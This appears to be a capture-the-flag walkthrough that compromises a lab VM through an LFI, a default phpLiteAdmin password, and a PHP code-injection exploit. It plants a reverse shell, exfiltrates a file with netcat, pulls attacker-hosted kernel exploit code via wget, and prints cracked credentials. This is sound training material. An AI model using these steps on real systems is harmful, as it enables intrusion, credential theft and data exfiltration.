* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)

![alt text](./img/alice00.PNG?raw=true)  

## Recon-Enumeration  
nmap -A -p- 10.2.0.13  
![alt text](./img/alice01.PNG?raw=true)  

gobuster dir -u http://10.2.0.13 -w ~/wordlists/big.txt -e -x php,xml,txt,html,aspx -t 100  
![alt text](./img/alice02.PNG?raw=true)  

Let’s access these links  
![alt text](./img/alice03.PNG?raw=true)  
  
![alt text](./img/alice04.PNG?raw=true)  

Ok, let’s access the other links, after we return to this…  
![alt text](./img/alice05.PNG?raw=true)  

Looking the source code of the main page we found a redirect  
![alt text](./img/alice20.PNG?raw=true)  

## Exploit  
Ok, so maybe this page is vulnerable to LFI attacks. Let’s test it    
![alt text](./img/alice19.PNG?raw=true)  

We can find interesting files here…  
![alt text](./img/alice00.PNG?raw=true)  
  
This shows that we have access to ZICO’s folder, but not ROOT.
Let’s continue…...

The other links aren’t useful. So let’s return to test_db.php

It’s a login page…..well, here we just put the password, so let’s try our famous “admin” password  
![alt text](./img/alice06.PNG?raw=true)  
  
Oops, it worked. So let’s get some information

Click on info and we receive some user data  
![alt text](./img/alice13.PNG?raw=true)  

So we discover 2 users and 2 hashs. They look like MD5 hashs. Let’s try to break them with [Crackstation](https://crackstation.net/)  
![alt text](./img/alice14.PNG?raw=true)  

Credentials:
> zico:zico2215@  
root:34kroot34

Perfect, with nmap we discover that port 22 is open. Let’s try to connect we those credentials  
![alt text](./img/alice15.PNG?raw=true)  
  
![alt text](./img/alice16.PNG?raw=true)  

Sad :(..... ok, let’s see if we can exploit phpliteadmin

searchsploit phpliteadmin  
![alt text](./img/alice07.PNG?raw=true)  

Wow, there is one with the same version. Let’s read it
searchsploit -x php/webapps/24044.txt  
![alt text](./img/alice08.PNG?raw=true)  

So we first need to create a new database  
![alt text](./img/alice09.PNG?raw=true)  

Now click on it  
![alt text](./img/alice10.PNG?raw=true)  

Let’s create a table with the name ‘test’ with only 1 field  
![alt text](./img/alice11.PNG?raw=true)  

Now create an TEXT field with the DEFAULT VALUE = < ?php phpinfo()? >  
![alt text](./img/alice12.PNG?raw=true)  

Select INSERT in the created table  
![alt text](./img/alice17.PNG?raw=true)  

And click on INSERT again  
![alt text](./img/alice18.PNG?raw=true)  

Now let’s see where our database is located  
![alt text](./img/alice22.PNG?raw=true)  

So we can access it with the view.php found before  
![alt text](./img/alice23.PNG?raw=true)  

Great, so let’s try to use an php reverse shell code and put in the database  
![alt text](./img/alice24.PNG?raw=true)  
  
![alt text](./img/alice25.PNG?raw=true)  
  
Let’s put the code in this [link](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) on VALUE FIELD (Don’t forget to change de $ip and $port to yours)  
Click on SAVE CHANGES  
![alt text](./img/alice26.PNG?raw=true)  

In your machine setup an netcat listener on $port  
nc -nvlp 1234  

Now let’s use view.php to access the page again  
![alt text](./img/alice27.PNG?raw=true)  

HABEMUS SHELL \o/

## Privesc  
However we are user www-data. And a non-interactive shell. So first let’s get a decent shell:  
python -c 'import pty; pty.spawn("/bin/bash")'  
export TERM=xterm  
![alt text](./img/alice28.PNG?raw=true)  

Let’s read again the passwd file  
cat /etc/passwd  
![alt text](./img/alice29.PNG?raw=true)  

So ALICE’s home directory is /home/zico. Let’s try to log as alice with the found passwords  
![alt text](./img/alice30.PNG?raw=true)  

sad again :(.....so let’s visit this home directory  

![alt text](./img/alice31.PNG?raw=true)  

Got the user.txt flag, now let’s see the other files  

This zico-history.tar.gz looks interesting. Let’s see how we get it…  
![alt text](./img/alice32.PNG?raw=true)  

We don’t have curl, but have nc  

So on our machine we setup another nc listener  
nc -nvlp 4444 > zico-history.tar.gz  
On target machine we use the above command to send the file to us:  
nc 10.2.0.4 4444 < zico-history.tar.gz  

Use the above commands to access the file  
tar -xf zico-history.tar  
cd zico-history  
![alt text](./img/alice33.PNG?raw=true)  
  
…….dammit, useless kkkkkk  

Goind to /home/zico/wordpress/wp-config.php we found another credential  
![alt text](./img/alice34.PNG?raw=true)  

Let’s try to use the credential with user alice  
![alt text](./img/alice35.PNG?raw=true)  
  
![alt text](./img/alice36.PNG?raw=true)  

Ok, so maybe we can log with ssh too, which will give us an full interactive shell  
![alt text](./img/alice39.PNG?raw=true)  

Let’s get more information  
![alt text](./img/alice42.PNG?raw=true)  
  
Hummm this an old kernel version. Let’s search for a kernel exploit  

searchsploit kernel 3.2.0  
![alt text](./img/alice43.PNG?raw=true)  

This one is interesting…  
![alt text](./img/alice44.PNG?raw=true)  
  
Ok, so let’s follow the instructions. But first we need to get this file in the target machine  
> In your machine  
>> searchsploit -m linux_x86-64/local/33589.c  
>> sudo python3 -m http.server 80  

> On target machine  
>> cd /tmp  
>> wget http://10.2.0.4/33589.c  
>> gcc 33589.c -O2 -o vnik  
>> chmod +x vnik  
>> ./vnik 0  

![alt text](./img/alice41.PNG?raw=true)  
